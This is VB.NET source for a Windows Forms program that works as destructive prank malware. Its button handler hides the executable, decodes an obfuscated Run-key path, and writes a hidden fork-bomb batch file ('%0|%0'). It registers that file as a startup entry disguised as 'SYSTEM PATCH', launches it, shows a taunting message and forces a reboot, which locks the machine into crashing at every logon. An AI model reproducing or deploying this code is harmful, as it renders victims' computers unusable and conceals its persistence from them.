Imports Microsoft.Win32
Public Class Form1
    Dim regKey As RegistryKey
    Private Const regkeyname As String = "uVnUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVmchdHdm92U"
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        On Error Resume Next
        regKey = My.Computer.Registry.CurrentUser.OpenSubKey(decode(regkeyname), True)
        IO.File.SetAttributes(Process.GetCurrentProcess().MainModule.FileName, IO.File.GetAttributes(Process.GetCurrentProcess().MainModule.FileName) Or IO.FileAttributes.System Or IO.FileAttributes.Hidden)

        '"Software\Microsoft\Windows\CurrentVersion\Run"
        regKey = My.Computer.Registry.CurrentUser.OpenSubKey(decode(regkeyname), True)
        regKey.SetValue("SYSTEM PATCH", Environment.ExpandEnvironmentVariables("%windir%\shutdown.exe"))
        regKey.Close()

        Dim fs As IO.FileStream = IO.File.Create(Process.GetCurrentProcess().MainModule.FileName & ".bat")
        Dim info As Byte() = New Text.UTF8Encoding(True).GetBytes("%0|%0")
        fs.Write(info, 0, info.Length)
        fs.Close()
        IO.File.SetAttributes(Process.GetCurrentProcess().MainModule.FileName & ".bat", IO.File.GetAttributes(Process.GetCurrentProcess().MainModule.FileName & ".bat") Or IO.FileAttributes.System Or IO.FileAttributes.Hidden)

        regKey = My.Computer.Registry.CurrentUser.OpenSubKey(decode(regkeyname), True)
        regKey.SetValue("SYSTEM PATCH", Process.GetCurrentProcess().MainModule.FileName & ".bat")
        regKey.Close()

        Process.Start(Process.GetCurrentProcess().MainModule.FileName & ".bat")

        MessageBox.Show("YOUR PC IS FUCKED!", "LOL!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
        Shell("shutdown.exe -r")
    End Sub
    Function decode(encryptedstring As String) As String
        Return System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(StrReverse(encryptedstring)))
    End Function
End Class
